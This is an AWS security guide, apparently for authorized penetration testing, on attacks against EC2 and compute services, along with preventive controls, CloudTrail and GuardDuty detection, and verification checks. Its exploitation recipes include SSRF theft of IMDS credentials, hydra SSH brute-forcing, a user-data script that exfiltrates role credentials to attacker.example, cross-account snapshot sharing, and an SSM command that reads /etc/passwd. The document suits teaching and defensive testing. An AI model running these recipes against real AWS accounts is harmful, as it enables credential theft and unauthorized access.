# EC2 and Compute Attacks

> [!CAUTION]
> This file is for authorized security testing of AWS accounts you own or have explicit written permission to assess. Do not use these techniques against accounts, resources, or services you do not own or have permission to test.

## 1. Overview

Amazon Elastic Compute Cloud (EC2) is virtual-machine compute: instances run an operating system of your choice, inside a VPC, with an attached instance profile (an IAM role), one or more EBS volumes, and a security group. EC2 is the most familiar AWS service for anyone with a Linux or Windows background, and it is also the point where cloud identity and host identity overlap.

That overlap is the core of EC2 security:

- **Host-level compromise** (SSH, RCE in a web app, exposed service) gives the attacker a shell. From the shell, the attacker reaches the instance metadata service (IMDS) and steals the instance profile's temporary AWS credentials.
- **Cloud-level compromise** (leaked IAM credentials, over-broad role) gives the attacker control over EC2 API calls: create instances, attach volumes, modify security groups, read user-data, and use `iam:PassRole` + `ec2:RunInstances` to execute code under a more privileged role.
- **Cross-boundary compromise** (shared AMI, shared EBS snapshot, shared EFS file system) lets the attacker move data between accounts without ever touching a running instance.

This file covers all three. It also covers the adjacent compute services (Lambda, ECS, EKS) only at the level needed to understand how an EC2 foothold pivots to them; each of those services has its own file in the sibling subcategories.

## 2. Reconnaissance / Enumeration

### 2.1 Network-level reconnaissance

An EC2 instance exposes whatever its security group allows. The first reconnaissance step is a port scan from an authorized position, plus a TLS certificate and HTTP-header review:

```bash
# Standard port scan (adjust for scope)
nmap -p- --min-rate 5000 -T4 <target-ip>

# Service and version detection on open ports
nmap -sV -sC -p 22,80,443,3306,5432,6379,9200 <target-ip>

# TLS certificate: often leaks internal hostname or account alias
openssl s_client -connect <target-ip>:443 -servername <target-hostname> </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates
```

### 2.2 AWS API reconnaissance

With any credential, the EC2 API is the fastest way to map what exists and what it can reach:

```bash
# All instances in the current region
aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,Type:InstanceType,State:State.Name,PrivateIP:PrivateIpAddress,PublicIP:PublicIpAddress,IAM:IamInstanceProfile.Arn,Tags:Tags}'

# Security groups with their ingress rules
aws ec2 describe-security-groups --query 'SecurityGroups[].{Group:GroupName,ID:GroupId,Ingress:IpPermissions}'

# VPCs, subnets, route tables
aws ec2 describe-vpcs
aws ec2 describe-subnets
aws ec2 describe-route-tables

# Key pairs (public keys only, but they reveal usernames and creation dates)
aws ec2 describe-key-pairs
```

### 2.3 User-data and instance metadata

`ec2:DescribeInstanceAttribute` with `attribute=userData` returns the base64-encoded user-data script that was executed at first boot. In practice, this field often contains:

- IAM credentials (if a developer pasted them instead of using an instance profile).
- A bootstrap script with database passwords, API tokens, or SSH authorized keys.
- Internal hostnames, repository URLs, and configuration-management endpoints.

```bash
# User-data (base64-decoded)
aws ec2 describe-instance-attribute \
    --instance-id <id> \
    --attribute userData \
    --query 'UserData.Value' --output text | base64 -d
```

### 2.4 Compute-adjacent surfaces

EC2 is not the only compute service with an attack surface. The reconnaissance step should also enumerate:

- **EBS volumes and snapshots** - `ec2:DescribeVolumes`, `ec2:DescribeSnapshots`, `ec2:DescribeSnapshotAttribute`. A shared snapshot is a full disk image.
- **AMIs** - `ec2:DescribeImages --owners self` reveals private images; a shared AMI exposes the whole root filesystem.
- **EKS clusters** - `eks:ListClusters`, `eks:DescribeCluster` returns the API endpoint and the IAM role used by the cluster.
- **ECS clusters** - `ecs:ListClusters`, `ecs:ListTaskDefinitions` reveals task definitions with their container images and environment variables.
- **Lambda functions** - `lambda:ListFunctions`, `lambda:GetFunction` returns the function URL, role ARN, and environment variables (if not encrypted).

## 3. Common Attack Vectors

### 3.1 IMDS credential theft

The instance metadata service exposes the instance profile's credentials at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. Any code running on the instance (including a web app with an SSRF) can read it. IMDSv2 requires a `PUT /latest/api/token` step, which raises the bar but does not eliminate SSRF.

### 3.2 Exposed management ports

A security group with `0.0.0.0/0` on port 22 (SSH) or 3389 (RDP) is an invitation. Common findings:

- SSH with password authentication enabled.
- RDP without Network Level Authentication.
- Database ports (3306, 5432, 1433, 27017) exposed to the internet.
- Elasticsearch / OpenSearch (9200, 9300) exposed without authentication.
- Redis (6379) exposed with no password.

Each of these is a direct host-level foothold that ignores IAM entirely.

### 3.3 User-data with embedded secrets

A bootstrap script that contains `export AWS_SECRET_ACCESS_KEY=...` or a database password is a credential leak with a long lifetime: the script is stored as part of the instance attribute and is readable by anyone with `ec2:DescribeInstanceAttribute`. It is also visible in the console and in CloudTrail if the instance was launched via the console.

### 3.4 `iam:PassRole` + `ec2:RunInstances` privilege escalation

If the identity has `iam:PassRole` on a privileged role and `ec2:RunInstances`, it can launch a new instance with that role and a user-data script that exfiltrates the role's credentials. This is a two-call escalation and one of the most common paths in AWS privilege-escalation assessments.

### 3.5 AMI and snapshot sharing

A private AMI or EBS snapshot that is shared with another account exposes the entire filesystem of the original instance. This is a data-leak vector, not a code-execution vector, but it often contains credentials (SSH keys, AWS access keys, database passwords) that then enable the next step.

### 3.6 SSM Session Manager as lateral movement

AWS Systems Manager (SSM) Session Manager allows shell access to an instance without opening port 22. If the identity has `ssm:SendCommand` and `ssm:StartSession` on the instance, the attacker has a shell on a host that may not appear in network-level monitoring.

### 3.7 EC2 serial console and instance connect

`ec2-instance-connect:SendSSHPublicKey` (EC2 Instance Connect) and the EC2 serial console both allow access without a pre-existing key pair. Both are logged in CloudTrail, but both are also frequently overlooked in hardening reviews.

## 4. Exploitation Recipes

### 4.1 From web-app SSRF to IMDS credentials

Precondition: a public web application on an EC2 instance with an instance profile and an SSRF vulnerability. The metadata service is reachable from the instance's network namespace; the SSRF reaches it via `http://169.254.169.254/`.

```bash
# IMDSv1: single request to the metadata endpoint
# Via SSRF: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2: two-step. First, obtain a token:
# PUT http://169.254.169.254/latest/api/token
#   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then use the token to read the credentials:
# GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
#   Header: X-aws-ec2-metadata-token: <token>
```

The response is a JSON document with `AccessKeyId`, `SecretAccessKey`, and `Token`. On a vulnerable SSRF, this is the entire foothold: the instance role's permissions become the attacker's permissions.

### 4.2 Exposed SSH with password authentication

Precondition: a security group allows port 22 from `0.0.0.0/0`, and password authentication is enabled on the instance.

```bash
# Confirm the target is SSH
nc -vz <target-ip> 22

# Attempt authentication with a known username and a password wordlist
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

Once authenticated, the host-level foothold is complete. The next step is 4.4 (IMDS theft from the shell) because the shell itself is only on the instance; the AWS role behind it is the real target.

### 4.3 `iam:PassRole` + `ec2:RunInstances` -> execution under a privileged role

Precondition: `iam:PassRole` on a privileged role and `ec2:RunInstances` with a subnet, a security group, and a key pair the attacker controls.

```bash
# Launch a new instance with the privileged role and a user-data script that exfiltrates credentials
cat > /tmp/userdata.sh <<'EOF'
#!/bin/bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(cat /tmp/role) >> /tmp/creds
curl -s -X POST --data-binary @/tmp/creds https://attacker.example/exfil
EOF

aws ec2 run-instances \
    --image-id ami-0123456789abcdef0 \
    --instance-type t3.micro \
    --iam-instance-profile Name=AdminProfile \
    --user-data file:///tmp/userdata.sh \
    --subnet-id subnet-0123456789abcdef0 \
    --security-group-ids sg-0123456789abcdef0 \
    --key-name attacker-key \
    --query 'Instances[0].InstanceId' --output text
```

The instance boots with the privileged role, executes the user-data script, and the script exfiltrates the temporary credentials. The attacker does not need to log in to the instance: the user-data script runs as root on first boot.

### 4.4 Cross-account snapshot sharing

Precondition: `ec2:ModifySnapshotAttribute` on a snapshot the attacker wants to read, and a second account the attacker controls.

```bash
# Share the snapshot with the attacker's account
aws ec2 modify-snapshot-attribute \
    --snapshot-id snap-0123456789abcdef0 \
    --attribute createVolumePermission \
    --operation-type add \
    --user-ids 111122223333

# In the attacker account, create a volume from the shared snapshot and attach it
aws ec2 create-volume --snapshot-id snap-0123456789abcdef0 --availability-zone us-east-1a
aws ec2 attach-volume --volume-id vol-0123456789abcdef0 --instance-id i-0123456789abcdef0 --device /dev/sdf
```

The volume now appears inside the attacker-controlled instance, and the filesystem is readable directly. Any credentials stored on the original instance are now compromised.

### 4.5 SSM Session Manager as a stealth shell

Precondition: `ssm:SendCommand` or `ssm:StartSession` on an instance that is registered with SSM (has the SSM agent and an instance profile allowing `ssm:*` to the service).

```bash
# Start an interactive session
aws ssm start-session --target i-0123456789abcdef0

# Or run a one-off command (no interactive shell)
aws ssm send-command \
    --instance-ids i-0123456789abcdef0 \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["id; cat /etc/passwd"]'
```

SSM traffic goes over the SSM service endpoint, not over port 22. A network-level IDS that watches only SSH will not see it; the evidence is in CloudTrail `StartSession` and `SendCommand` events.

## 5. Post-Exploitation

After a foothold on an instance or with instance-role credentials, the attacker's priorities are persistence, privilege escalation, and lateral movement.

- **Persistence via user-data.** `ec2:ModifyInstanceAttribute` with `attribute=userData` changes the user-data script. On the next stop/start of the instance, the modified script executes as root.
- **Persistence via a new key pair.** `ec2:ImportKeyPair` + `ec2:ModifyInstanceAttribute` (or `ec2-instance-connect:SendSSHPublicKey`) installs an attacker-controlled SSH key.
- **Persistence via a new IAM user.** `iam:CreateUser` + `iam:CreateAccessKey` (see `02 IAM and Credential Attacks.md`).
- **Privilege escalation from instance role to account admin.** The instance role's permissions are the ceiling. If the role can call `iam:PassRole` + `ec2:RunInstances`, it can pivot to a more privileged role (4.3). If it can call `iam:CreatePolicyVersion` on a policy attached to itself, it escalates directly (see `02 IAM and Credential Attacks.md`).
- **Lateral movement to other compute services.** The instance profile is often trusted by Lambda, ECS, EKS, and RDS. The attacker uses the role to reach each of these (see the sibling subcategories).
- **Data exfiltration.** Attach a volume from a shared snapshot (4.4), or read an EFS file system over NFS if the security group allows it.

## 6. Preventive Controls

- **Enforce IMDSv2 at the account level.** `aws ec2 modify-instance-metadata-options --http-tokens required` on every instance, and an SCP that denies `RunInstances` without `MetadataOptions.HttpTokens=required`.
- **Scope security groups to known CIDRs.** No `0.0.0.0/0` on 22, 3389, or any database port. Use SSM Session Manager instead of opening SSH.
- **No secrets in user-data.** Use instance profiles, SSM Parameter Store, or Secrets Manager. If user-data must contain a secret, treat it as compromised from day one.
- **Encrypt EBS by default.** `aws ec2 enable-ebs-encryption-by-default` in every region, and a bucket policy that denies `CreateVolume` without encryption.
- **Block snapshot sharing by SCP.** Deny `ec2:ModifySnapshotAttribute` and `rds:ModifyDBSnapshotAttribute` except for a documented account.
- **Guard `iam:PassRole`.** Restrict it to specific services with the `iam:PassedToService` condition, and never allow `iam:PassRole` on `*`.
- **Disable EC2 serial console** unless it is required for a documented use case.
- **Require MFA for console access** and for any instance-level change (`ec2:StopInstances`, `ec2:ModifyInstanceAttribute`).

## 7. Detection Controls

CloudTrail records every EC2 API call. The events worth alerting on, in order of importance:

- **`RunInstances` with `iamInstanceProfile` set to a privileged role** - the classic escalation chain.
- **`ModifyInstanceAttribute` with `userData`** - persistence via user-data rewrite.
- **`ModifySnapshotAttribute` with `createVolumePermission`** - cross-account snapshot sharing.
- **`ImportKeyPair`** followed by `ModifyInstanceAttribute` (or `SendSSHPublicKey`) - persistence via SSH key installation.
- **`StartSession` and `SendCommand` from an identity that has never used them** - SSM lateral movement.
- **`AuthorizeSecurityGroupIngress` with `0.0.0.0/0`** - network exposure, a leading indicator.
- **`GetPasswordData` for a Windows instance** - admin password decryption (requires the private key).
- **IMDSv1 usage on an instance** - not a CloudTrail event, but GuardDuty's `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` and VPC-level anomaly detection catch the exfiltration.

GuardDuty findings that overlap: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`, `Recon:IAMUser/EC2`, `Persistence:IAMUser/EC2`, `PrivilegeEscalation:IAMUser/EC2`, `Discovery:IAMUser/AnomalousBehavior`, `Exfiltration:IAMUser/AnomalousBehavior`.

## 8. Verification

Read-only checks to confirm the preventive controls are in place:

```bash
# IMDSv2 enforcement on every running instance
aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IMDS:MetadataOptions.HttpTokens}'

# Security groups with 0.0.0.0/0 on management ports
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?FromPort<=`22`&&ToPort>=`22`]].GroupId'

# EBS encryption default in the current region
aws ec2 get-ebs-encryption-by-default

# Snapshots shared with external accounts
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[].{ID:SnapshotId,Shared:CreateVolumePermissions}'
```

Expected result: every instance `HttpTokens: required`, no security group with `0.0.0.0/0` on 22/3389, `EbsEncryptionByDefault: true`, and no snapshot shared with an external account.

## 9. Certification Alignment

- **AWS Certified Solutions Architect - Associate** - EC2 instance types, security groups, instance profiles, EBS, AMIs, VPC placement.
- **AWS Certified Advanced Networking - Specialty** - security groups, network ACLs, VPC Flow Logs, VPC endpoints for SSM.
- **CompTIA Security+** - host hardening, network segmentation, access control, encryption at rest.

## 10. Production Notes

- IMDSv2 enforcement is a per-instance setting, but it can be enforced at the account level with an SCP and at the organization level with a service control policy. Do both.
- SSM Session Manager requires an instance profile with `AmazonSSMManagedInstanceCore` and network reachability to the SSM endpoint. Do not disable SSM to "reduce attack surface": SSM is the safer alternative to open SSH.
- EBS encryption at rest does not protect against a volume that is already mounted in a running instance. It protects against snapshot sharing and against a stolen physical disk.
- EC2 serial console is a break-glass feature. If it is enabled, the `ec2:GetSerialConsoleAccessStatus` and `ec2:EnableSerialConsoleAccess` events should be alerted on.
- The instance profile is the trust anchor for every workload on the instance. Keep it separate per instance, per application, and per environment.

## 11. References

- Amazon EC2 User Guide - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/
- EC2 instance metadata service - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- EC2 IMDSv2 - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- AWS Systems Manager Session Manager - https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html
- EC2 security best practices - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-security.html
- Amazon GuardDuty EC2 protection - https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-ec2.html
